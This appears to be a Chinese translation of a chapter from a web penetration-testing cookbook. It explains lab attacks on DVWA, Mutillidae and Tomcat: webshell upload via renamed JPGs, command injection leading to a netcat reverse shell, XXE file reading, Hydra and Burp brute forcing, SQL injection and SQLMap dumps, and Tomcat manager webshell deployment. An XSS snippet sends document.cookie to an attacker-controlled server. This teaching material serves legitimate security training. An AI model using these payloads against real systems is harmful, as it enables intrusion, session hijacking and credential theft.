### 简介

这章开始我们会开始涉及渗透测试的的利用层面。和漏洞评估的主要不同是，漏洞评估中测试者识别漏洞（多数时间使用自动化扫描器）和提出如何减轻它们的建议。而渗透测试中测试者作为恶意攻击者并尝试利用检测到的漏洞，并得到最后的结果：整个系统的沦陷，内部网络访问，敏感数据泄露，以及其它。同时，要当心不要影响系统的可用性或者为真正的攻击者留下后门。





### 1. 恶意使用文件包含和上传



##### 工作原理

在上传有效 JPG 文件时，我们所做的第一个测试是为了发现上传文件保存的路径，便于我们可以在`rename.php`中，以及表单的`action`中使用这个路径。

使用重命名脚本有两个重要原因：首先，上传页面只允许 JPG 文件，所以我们的脚本需要这个扩展名，其次，我们需要带参数调用我们的 webshell（要执行的命令），而我们从 Web 服务器调用图片时不能带参数。

PHP 中的`system()`函数是攻击核心，它所做的是，执行系统命令并显示输出。这允许我们将 webshell 文件从`.jpg`重命名为`.php`文件并执行我们指定为 GET 参数的命令。



### 2. 利用OS命令注入





##### 工作原理

就像 SQL 注入的例子那样，命令注入漏洞的来源于弱输入校验机制，以及使用用户提供的数据来拼接之后会用做 OS 命令的字符串。如果我们查看刚刚攻击的页面源代码（每个 DVWA 页面的右下角会有个按钮），会看到这些：

```php
<?php
if( isset( $_POST[ 'submit' ] ) ) {

    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.    
    if (stristr(php_uname('s'), 'Windows NT')) {
        $cmd = shell_exec( 'ping  ' . $target );        
        echo '<pre>'.$cmd.'</pre>';            

    } else {             
        $cmd = shell_exec( 'ping  -c 3 ' . $target );        
        echo '<pre>'.$cmd.'</pre>';        
    }    
} 
?>
```

我们可以看到，它直接将用户的输入附加到 ping 命令后面。我们所做的仅仅是添加一个分号，系统的 shell 会将其解释为命令的分隔符，以及下一个我们打算执行的命令。

在成功执行命令之后，下一步就是验证服务器是否拥有 Netcat。它是一个能够建立网络连接的工具，在一些版本中还可以在新连接建立之后执行命令。我们看到了服务器的系统拥有两个不同版本的 Netcat，并执行了我们已知支持所需特性的版本。

之后我们配置攻击系统来监听 TCP 1691 端口连接（也可以是任何其它可用的 TCP 端口），然后我们让服务器连接到我们的机器，通过该端口并在连接建立时执行`/bin/bash`（系统 shell）。所以我们通过连接发送的任何东西都会被服务器接收作为 shell 的输入。

也可以让服务器下载一些恶意程序，例如提权利用，执行它来获得更高权限。







### 3. 利用XML外部实体注入

XML 是主要用于描述文档或数据结构的格式，例如，HTML 是XML 的实现，它定义了页面和它们的关系的结构和格式。

XML 实体类似于定义在 XML 结构中的数据结构，它们中的一些能够从文件系统中读取文件或者甚至是执行命令。





##### 工作原理

XML 拥有叫做实体的特性。XML 实体是与值关联的名称，每次实体在文档中使用的时候，它都会在 XML文件处理时替换为值。使用它以及不同的可用包装器（`file://`来加载系统文件，或者`http://`来加载 URL），我们就可以通过输入校验和XML 解析器的配置，恶意使用没有合理安全措施的实现，并提取敏感数据或者甚至在服务器中执行系统命令。

这个秘籍中，我们使用`file://`包装器来使解析器加载服务器中的任意文件，之后，使用`http://`包装器，我们调用了网页，它碰巧是同一个服务器中的 webshell，并执行了一些命令。





### 4. 使用Hydra爆破密码





##### 工作原理

这个秘籍的第一个部分是捕获和分析请求，用于了解请求如何工作。如果我们考虑登录页面的输出，我们会看到消息“登录失败”，并且可以使用这个消息作为 Hydra的输入来充当失败的字符串。但是，通过检查代理的历史，我们可以看到它出现在重定向之后，Hydra只读取第一个响应，所以它并不能用，这也是我们使用`login.php`作为失败字符串的原因。

我们使用了多个参数来调用 Hydra：

- 首先是服务器的 IP 地址。
- `http-form-post`：这表明 Hydra 会对 HTTP 表单使用 POST 请求。接下来是由冒号分隔的，登录页面的 URL。请求参数和失败字符串由`&`分隔，`^USER^`和`^PASS^`用于表示用户名和密码应该在请求中被放置的位置。
- `-L users.txt`：这告诉 Hydra 从`users.txt`文件接收用户名称。
- `-e ns`：Hydra 会尝试空密码并将用户名作为密码。
- `-u`：Hydra会首先迭代用户名而不是密码。这意味着Hydra首先会对单一的密码尝试所有用户名，之后移动到下一个密码。这在防止账户锁定的时候很有用。
- `-t 2`：我们不想让登录请求填满服务器，所以我们使用两个线程，这意味着每次两个请求。
- `-w 30`：设置超时时间，或者等待服务器响应的时间。
- `-o hydra-result.txt`：将输出保存到文本文件中。当我们拥有几百个可能有效的密码时这会很实用。



### 5. 使用Burp Suite执行登录页面的字典爆破



##### 工作原理

Intruder 所做的是，修改请求的特定部分，并使用定义好的载荷替换这些部分的值。载荷可以是这些东西：

- 简单列表：来自文件，由剪贴板传递或者写在文本框中的列表。
- 运行时文件：Intruder 可以在运行时从文件中读取载荷，所以如果文件非常大，它不会完全加载进内存。
- 数字：生成一列顺序或随机的数字，以十进制或十六进制形式。
- 用户名生成器：接受邮件地址列表，从中提取可能的用户。
- 爆破器：接受字符集并使用它来生成指定长度的所有排列。

这些载荷由Intruder以不同形式发送，在`Positions`标签页中由攻击类型指定。攻击类型在载荷标记中的组合和排列方式上有所不同。

- Sniper：对于载荷的单一集合，它将每个载荷值放在每个标记位置，一次一个。
- Battering ram：类似Sniper，它使用载荷的单一集合，不同点是它在每个请求中将所有位置设置为相同的值。
- Pitchfork：使用多个载荷集合，并将每个集合中的一个项目放到每个标记位置中。当我们拥有不能混用的预定义数据时，这会非常有用，例如，测试已知的用户名和密码。
- Cluster bomb：测试多个载荷，所以每个可能的排列都可以测试到。

对于结果，我们可以看到所有失败尝试都有相同的响应，这里是 811 字节。所以我们假设成功响应的长度应该不同（因为它会重定向到用户主页）。如果碰巧成功和失败请求长度相同，我们也可以检查状态码或者使用搜索框来寻找响应中的特定模式。









### 6.  通过 XSS 获得会话 Cookie





##### 工作原理

简单来说，我们使用应用中的 XSS 漏洞来将会话 Cookie 发送给远程服务器，通过 JavaScript HTTP 请求。这个服务器被配置用于储存会话 Cookie，之后，我们获得一个会话 ID，并把它移植到不同的浏览器中来劫持验证用户的会话。下面，我们来看看每一步如何工作。

我们编写的 PHP 文件用于在 XSS 攻击执行时保存收到的 COokie。

我们输入的评论是一个脚本，使用JavaScript 的XMLHttpRequest 对象来向我们的恶意服务器发送 HTTP 请求，这个请求由两步构建：

```js
xmlHttp.open( "GET", "http://192.168.56.1/savecookie.php?cookie=" + document.cookie, true );
```

我们使用 GET 方法打开请求，向`http://192.168.56.1/savecookie.php` URL添加叫做`cookie`的参数，它的值储存在`document.cookie`中，它是 JavaScript 中储存cookie值的变量。最后的参数设置为`true`，告诉浏览器这是异步请求，这意味着它不需要等待响应。

```js
xmlHttp.send( null )
```

最后的指令将请求发送给服务器。

在管理员登录并查看包含我们所发送评论的页面之后，脚本会执行，并且管理员的会话 cookie 就储存在我们的服务器中了。

最后，一旦我们获得了有效用户的会话 cookie，我们可以在浏览器中替换我们自己的会话 cookie，之后重新加载页面来执行操作，就像我们是这个用户一样。





### 7. 逐步执行基本的 SQL 注入





##### 工作原理

在我们的第一次注入，`1' order by 1 -- '`到`1' order by 3 -- '`中，我们使用 SQL 语言的特性，它允许我们通过特定的字段或类，使用它的编号来排列结果。我们用它来产生错误，于是能够知道查询一共有多少列，便于我们将其用于创建 UNION 查询。

UNION 查询语句用于连接两个拥有相同列数量的查询，通过注入这些我们就可以查询数据库中几乎所有东西。这个秘籍中，我们首先检查了它是否像预期一样工作，之后我们将目标设置为`users`表，并设法获得它。

第一步是弄清数据库和表的名称，我们通过查询`information_schema`数据库来实现，它是 MySQL 中储存所有数据库、表和列信息的数据库。

一旦我们知道了数据库和表的名称，我们在这个表中查询所有列，来了解我们需要查找哪一列，它的结果是`user`和`password`。

最后，我们注入查询来请求`dvwa`数据库的`users`表中的所有用户名和密码





### 8。 使用SQLMap发现和利用SQL注入



##### 工作原理

SQLMap 会使用 SQL 注入字符串，对给定 URL 和数据的输入进行模糊测试，或者只针对`-p`选项中的特定目标，并且解释其响应来发现是否存在漏洞。不要模糊测试所有输入，最好使用 SQLMap 来利用我们已知存在的注入，并始终尝试缩小搜索过程，通过提供所有可用的信息，例如漏洞参数、DBMS 类型，以及其它。在所有可能性下寻找注入会花费大量时间，并在网络中产生非常大的流量。

这个秘籍中，我们已经知道了用户名参数存在注入漏洞（因为我们使用了 Mutillidae 的注入测试页面）。在第一个攻击中，我们只希望确认注入是否存在，并询问一些非常基本的信息：用户名（`--curent-user`）和数据库名称（`--current-db`）。

在第二个攻击中，我们使用`-D`选项，以及前一次攻击所获得的名称，指定希望查询的数据库，我们也使用`--tables`询问了所包含的表名称。

知道我们希望获得哪个表（`-T accounts`）之后，我们告诉 SQLMap 使用`--dump`转储它的内容





### 9. 使用Metasploit攻击Tomcat的密码

Apache Tomcat，是世界上最广泛使用的 Java Web 服务器之一。带有默认配置的 Tomcat 服务器非常容易发现。发现暴露 Web 应用管理器的服务器也非常容易，它是一个应用，允许管理员启动、停止、添加和删除服务器中的应用。





##### 工作原理

通常 Tomcat 使用 TCP 8080，它的管理器应用位于`/manager/html`中。这个应用使用基本的 HTTP 验证。我们刚刚使用的 Metasploit 辅助模块（`tomcat_mgr_login`）有一些值得提及的配置项：

- `BLANK_PASSWORDS`：对每个尝试的用户添加空密码测试。
- `PASSWORD`：如果我们打算测试多个用户的单一密码，或者添加列表中没有包含的项目，这就很实用。
- `PASS_FILE`：用于测试的密码列表。
- `Proxies`：如果我们需要通过代理来访问我们的目标，或者避免检测，就用这个选项。
- `RHOSTS`：单个主机，或多个（使用空格分隔），或者我们想要测试的主机列表文件（`/path/to/file/with/hosts`）。
- `RPORT`：Tomcat 所使用的 TCP 端口。
- `STOP_ON_SUCCESS`：发现有效密码之后停止尝试。
- `TARGERURI`：主机中管理器应用的位置。
- `USERNAME`指定特殊的用户名来测试，它可以被单独测试，或者添加到定义在`USER_FILE`的列表中。
- `USER_PASS_FILE`：包含要被测试的“用户名 密码”组合的文件。
- `USER_AS_PASS`：将每个列表中的用户名作为密码尝试。





### 10. 使用Tomcat管理器来执行代码





##### 工作原理

一旦我们获得了 Tomcat 管理器的身份认证，攻击过程就相当直接了。我们仅仅需要足以让我们上传它的应用。Laudanum 默认包含在 Kali 中，是多种语言和类型的 webshell 的集合，包括 PHP、ASP、 ASP.NET 和 JSP。对渗透测试者来说，什么比 webshell 更有用呢？

Tomcat 能够接受以 WAR（Web 应用归档）格式打包的 Java Web 应用并将其部署到服务器上。我们刚刚使用了这一特性来上传 Laudanum 中的 webshell。在它上传和部署之后，我们浏览它并且通过执行系统命令，我们发现我们拥有这个系统的 root 访问。